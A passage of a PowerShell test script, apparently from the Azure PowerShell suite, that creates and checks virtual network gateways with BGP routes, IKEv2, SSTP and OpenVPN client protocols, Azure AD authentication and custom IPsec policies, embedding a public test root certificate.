		$bgpPeerStatus = $job | Receive-Job

		$job = Get-AzVirtualNetworkGatewayLearnedRoute -ResourceGroupName $rgname -VirtualNetworkGatewayName $gwname -AsJob
		$job | Wait-Job
		$bgpLearnedRoutes = $job | Receive-Job

        if($bgpLearnedRoutes -and $bgpLearnedRoutes.Length -gt 0)
        {
            forEach($route in $bgpLearnedRoutes)
            {
                if($route.Origin -eq "EBgp")
                {
                    Assert-True { $vnet1.AddressSpace.AddressPrefixes -contains $route.Network }
                }
            }
        }

        if($bgpPeerStatus -and $bgpPeerStatus.Length -gt 0)
        {
            $job = Get-AzVirtualNetworkGatewayAdvertisedRoute -ResourceGroupName $rgname -VirtualNetworkGatewayName $gwname -Peer $bgpPeerStatus[0].Neighbor -AsJob
            $job | Wait-Job
            $bgpAdvertisedRoutes = $job | Receive-Job
            Assert-True { $vnet.AddressSpace.AddressPrefixes -contains $bgpAdvertisedRoutes[0].Network }
        }
	}
	finally 
	{
		Clean-ResourceGroup $rgname
	}
}


function Test-VirtualNetworkGatewayIkeV2
{
	
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent

	try 
	{
		
		$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }
	
		
		$clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
		
		$samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
		$rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

		
		$subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
		$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
		$vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname      
		$subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

		
		$publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
		$vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      
		
		New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -VpnClientAddressPool 201.169.0.0/16 -VpnClientRootCertificates $rootCert -CustomRoute 192.168.0.0/24 -VpnClientProtocol "SSTP","IkeV2"
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
		Assert-AreEqual "VpnGw1" $actual.Sku.Tier
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 2 @($protocols).Count
		Assert-AreEqual "SSTP" $protocols[0]
		Assert-AreEqual "IkeV2" $protocols[1]
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes
        Assert-AreEqual "192.168.0.0/24" $actual.CustomRoutes.AddressPrefixes

		
		Set-AzVirtualNetworkGateway -VirtualNetworkGateway $actual -VpnClientProtocol IkeV2 -CustomRoute 192.168.1.0/24
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 1 @($protocols).Count
		Assert-AreEqual "IkeV2" $protocols[0]
        Assert-AreEqual "192.168.1.0/24" $actual.CustomRoutes.AddressPrefixes
		 
		
        Set-AzVirtualNetworkGateway -VirtualNetworkGateway $actual -VpnClientProtocol IkeV2 -CustomRoute @()
        $actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
        Assert-Null  $actual.CustomRoutes.AddressPrefixes
	}
	finally
    {
		
        Clean-ResourceGroup $rgname
    }
}


function Test-VirtualNetworkGatewayOpenVPN
{
	
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent

	try 
	{
		
		$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }
	
		
		$clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
		
		$samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
		$rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

		
		$subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
		$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
		$vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname      
		$subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

		
		$publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
		$vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      
		
		New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -VpnClientAddressPool 201.169.0.0/16 -VpnClientRootCertificates $rootCert
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
		Set-AzVirtualNetworkGateway -VirtualNetworkGateway $actual -VpnClientProtocol OpenVPN
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname

		Assert-AreEqual "VpnGw1" $actual.Sku.Tier
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 1 @($protocols).Count
		Assert-AreEqual "OpenVPN" $protocols[0]
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes
	}
	finally
    {
		
        Clean-ResourceGroup $rgname
    }
}


function Test-VirtualNetworkGatewayOpenVPNAADAuth
{
	
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent

	try 
	{
		
		$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }
	
		
		$aadTenant = "https://login.microsoftonline.com/0ab2c4f4-81e6-44cc-a0b2-b3a47a1443f4"
		$aadIssuer = "https://sts.windows.net/0ab2c4f4-81e6-44cc-a0b2-b3a47a1443f4/"
		$aadAudience = "a21fce82-76af-45e6-8583-a08cb3b956f9"
		$aadAudienceNew = "a21fce82-76af-45e6-8583-a08cb3b956g9"

		
		$subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
		$vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
		$vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname      
		$subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

		
		$publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
		$vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet
      
		
		New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -VpnClientProtocol OpenVPN -EnableBgp $false -GatewaySku VpnGw1 -VpnClientAddressPool 201.169.0.0/16 
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 1 @($protocols).Count
		Assert-AreEqual "OpenVPN" $protocols[0]
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes
		
		
		

		
		Set-AzVirtualNetworkGateway -VirtualNetworkGateway $actual -AadTenantUri $aadTenant -AadIssuerUri $aadIssuer -AadAudienceId $aadAudienceNew
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname

		Assert-AreEqual "VpnGw1" $actual.Sku.Tier
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 1 @($protocols).Count
		Assert-AreEqual "OpenVPN" $protocols[0]
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes
		Assert-AreEqual $aadTenant $actual.VpnClientConfiguration.AadTenant
		Assert-AreEqual $aadIssuer $actual.VpnClientConfiguration.AadIssuer
		Assert-AreEqual $aadAudienceNew $actual.VpnClientConfiguration.AadAudience

		
		$clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
		
		$samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
		$rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

		
		
		$actual = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname

		Assert-AreEqual "VpnGw1" $actual.Sku.Tier
		$protocols = $actual.VpnClientConfiguration.VpnClientProtocols
		Assert-AreEqual 1 @($protocols).Count
		Assert-AreEqual "OpenVPN" $protocols[0]
		Assert-AreEqual "201.169.0.0/16" $actual.VpnClientConfiguration.VpnClientAddressPool.AddressPrefixes
		
		
		
	}
	finally
    {
		
        Clean-ResourceGroup $rgname
    }
}


function Test-VirtualNetworkGatewayVpnCustomIpsecPolicySet
{
	param 
    ( 
        $basedir = ".\" 
    )

    
    $rgname = Get-ResourceName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent
	$vpnclientAuthMethod = "EAPTLS"
    
    try 
     {
      
      $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
      
	  
	  $clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
	  
	  $samplePublicCertData = "MIIDUzCCAj+gAwIBAgIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAMDQxEjAQBgNVBAoTCU1pY3Jvc29mdDEeMBwGA1UEAxMVQnJrIExpdGUgVGVzdCBSb290IENBMB4XDTEzMDExOTAwMjQxOFoXDTIxMDExOTAwMjQxN1owNDESMBAGA1UEChMJTWljcm9zb2Z0MR4wHAYDVQQDExVCcmsgTGl0ZSBUZXN0IFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7SmE+iPULK0Rs7mQBO/6a6B6/G9BaMxHgDGzAmSG0Qsyt5e08aqgFnPdkMl3zRJw3lPKGha/JCvHRNrO8UpeAfc4IXWaqxx2iBipHjwmHPHh7+VB8lU0EJcUe7WBAI2n/sgfCwc+xKtuyRVlOhT6qw/nAi8e5don/iHPU6q7GCcnqoqtceQ/pJ8m66cvAnxwJlBFOTninhb2VjtvOfMQ07zPP+ZuYDPxvX5v3nd6yDa98yW4dZPuiGO2s6zJAfOPT2BrtyvLekItnSgAw3U5C0bOb+8XVKaDZQXbGEtOw6NZvD4L2yLd47nGkN2QXloiPLGyetrj3Z2pZYcrZBo8hAgMBAAGjaTBnMGUGA1UdAQReMFyAEOncRAPNcvJDoe4WP/gH2U+hNjA0MRIwEAYDVQQKEwlNaWNyb3NvZnQxHjAcBgNVBAMTFUJyayBMaXRlIFRlc3QgUm9vdCBDQYIQRggGmrpGj4pCblTanQRNUjAJBgUrDgMCHQUAA4IBAQCGyHhMdygS0g2tEUtRT4KFM+qqUY5HBpbIXNAav1a1dmXpHQCziuuxxzu3iq4XwnWUF1OabdDE2cpxNDOWxSsIxfEBf9ifaoz/O1ToJ0K757q2Rm2NWqQ7bNN8ArhvkNWa95S9gk9ZHZLUcjqanf0F8taJCYgzcbUSp+VBe9DcN89sJpYvfiBiAsMVqGPc/fHJgTScK+8QYrTRMubtFmXHbzBSO/KTAP5rBTxse88EGjK5F8wcedvge2Ksk6XjL3sZ19+Oj8KTQ72wihN900p1WQldHrrnbixSpmHBXbHr9U0NQigrJp5NphfuU5j81C8ixvfUdwyLmTv7rNA7GTAD";
	  $rootCert = New-AzVpnClientRootCertificate -Name $clientRootCertName -PublicCertData $samplePublicCertData

      
	  $subnet = New-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -AddressPrefix 10.0.0.0/24
	  $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
	  $vnet = Get-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname      
	  $subnet = Get-AzVirtualNetworkSubnetConfig -Name "GatewaySubnet" -VirtualNetwork $vnet

	  
	  $publicip = New-AzPublicIpAddress -ResourceGroupName $rgname -name $publicIpName -location $location -AllocationMethod Dynamic -DomainNameLabel $domainNameLabel
	  $vnetIpConfig = New-AzVirtualNetworkGatewayIpConfig -Name $vnetGatewayConfigName -PublicIpAddress $publicip -Subnet $subnet

      
	  $vpnclientipsecpolicy1 = New-AzVpnClientIpsecPolicy -IpsecEncryption AES256 -IpsecIntegrity SHA256 -SALifeTime 86471 -SADataSize 429496 -IkeEncryption AES256 -IkeIntegrity SHA384 -DhGroup DHGroup2 -PfsGroup PFS2
      $actual = New-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname -location $location -IpConfigurations $vnetIpConfig -GatewayType Vpn -VpnType RouteBased -EnableBgp $false -GatewaySku VpnGw1 -VpnClientProtocol IkeV2 -VpnClientAddressPool 201.169.0.0/16 -VpnClientRootCertificates $rootCert -VpnClientIpsecPolicy $vpnclientipsecpolicy1

	  
      $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
	  $protocols = $expected.VpnClientConfiguration.VpnClientProtocols
	  Assert-AreEqual 1 @($protocols).Count
	  Assert-AreEqual "IkeV2" $protocols[0]
	  Assert-AreEqual 1 @($expected.VpnClientConfiguration.VpnClientIpsecPolicies).Count
      Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].SALifeTimeSeconds $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].SALifeTimeSeconds
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].SADataSizeKilobytes $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].SADataSizeKilobytes
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecEncryption $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecEncryption
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecIntegrity $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecIntegrity
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeEncryption $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeEncryption
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeIntegrity $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeIntegrity
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].DhGroup $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].DhGroup
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].PfsGroup $actual.VpnClientConfiguration.VpnClientIpsecPolicies[0].PfsGroup
            
      
	  $vpnclientipsecpolicy2 = New-AzVpnClientIpsecPolicy -IpsecEncryption AES256 -IpsecIntegrity SHA256 -SALifeTime 86472 -SADataSize 429497 -IkeEncryption AES256 -IkeIntegrity SHA256 -DhGroup DHGroup2 -PfsGroup None
	  $gateway = Set-AzVirtualNetworkGateway -VirtualNetworkGateway $expected -VpnClientIpsecPolicy $vpnclientipsecpolicy2
	  Assert-AreEqual $vpnclientipsecpolicy2.SALifeTimeSeconds $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].SALifeTimeSeconds
	  Assert-AreEqual $vpnclientipsecpolicy2.SADataSizeKilobytes $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].SADataSizeKilobytes
	  Assert-AreEqual $vpnclientipsecpolicy2.IpsecEncryption $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecEncryption
	  Assert-AreEqual $vpnclientipsecpolicy2.IpsecIntegrity $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecIntegrity
	  Assert-AreEqual $vpnclientipsecpolicy2.IkeEncryption $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeEncryption
	  Assert-AreEqual $vpnclientipsecpolicy2.IkeIntegrity $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeIntegrity
	  Assert-AreEqual $vpnclientipsecpolicy2.DhGroup $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].DhGroup
	  Assert-AreEqual $vpnclientipsecpolicy2.PfsGroup $gateway.VpnClientConfiguration.VpnClientIpsecPolicies[0].PfsGroup
	  
	  
	  $vpnclientipsecparams1 = New-AzVpnClientIpsecParameter -IpsecEncryption AES256 -IpsecIntegrity SHA256 -SALifeTime 86473 -SADataSize 429498 -IkeEncryption AES256 -IkeIntegrity SHA384 -DhGroup DHGroup2 -PfsGroup PFS2
	  $setvpnIpsecParams = Set-AzVpnClientIpsecParameter -VirtualNetworkGatewayName $rname -ResourceGroupName $rgname -VpnClientIPsecParameter $vpnclientipsecparams1
	  
	  
	  $vpnIpsecParams = Get-AzVpnClientIpsecParameter -Name $rname -ResourceGroupName $rgname
	  Assert-AreEqual $vpnclientipsecparams1.SALifeTimeSeconds $vpnIpsecParams.SALifeTimeSeconds
	  Assert-AreEqual $vpnclientipsecparams1.SADataSizeKilobytes $vpnIpsecParams.SADataSizeKilobytes
	  Assert-AreEqual $vpnclientipsecparams1.IpsecEncryption $vpnIpsecParams.IpsecEncryption
	  Assert-AreEqual $vpnclientipsecparams1.IpsecIntegrity $vpnIpsecParams.IpsecIntegrity
	  Assert-AreEqual $vpnclientipsecparams1.IkeEncryption $vpnIpsecParams.IkeEncryption
	  Assert-AreEqual $vpnclientipsecparams1.IkeIntegrity $vpnIpsecParams.IkeIntegrity
	  Assert-AreEqual $vpnclientipsecparams1.DhGroup $vpnIpsecParams.DhGroup
	  Assert-AreEqual $vpnclientipsecparams1.PfsGroup $vpnIpsecParams.PfsGroup

	  $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
	  Assert-AreEqual 1 @($expected.VpnClientConfiguration.VpnClientIpsecPolicies).Count
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].SALifeTimeSeconds $vpnIpsecParams.SALifeTimeSeconds
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].SADataSizeKilobytes $vpnIpsecParams.SADataSizeKilobytes
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecEncryption $vpnIpsecParams.IpsecEncryption
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IpsecIntegrity $vpnIpsecParams.IpsecIntegrity
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeEncryption $vpnIpsecParams.IkeEncryption
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].IkeIntegrity $vpnIpsecParams.IkeIntegrity
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].DhGroup $vpnIpsecParams.DhGroup
	  Assert-AreEqual $expected.VpnClientConfiguration.VpnClientIpsecPolicies[0].PfsGroup $vpnIpsecParams.PfsGroup

	  
	  $delete = Remove-AzVpnClientIpsecParameter -ResourceGroupName $rgname -VirtualNetworkGatewayName $rname
	  Assert-AreEqual $True $delete
	  $expected = Get-AzVirtualNetworkGateway -ResourceGroupName $rgname -name $rname
	  Assert-AreEqual 0 @($expected.VpnClientConfiguration.VpnClientIpsecPolicies).Count
	  
     }
     finally
     {
        
        Clean-ResourceGroup $rgname
     }
}


function Test-VirtualNetworkGatewayVpnClientConnectionHealth
{
	param 
    ( 
        $basedir = ".\" 
    )

	
    $rgname = Get-ResourceGroupName
    $rname = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $vnetName = Get-ResourceName
    $publicIpName = Get-ResourceName
    $vnetGatewayConfigName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/virtualNetworkGateways"
    $location = Get-ProviderLocation $resourceTypeParent

	try 
	{
		
		$resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" }
	
		
		$clientRootCertName = "BrkLiteTestMSFTRootCA.cer"
		
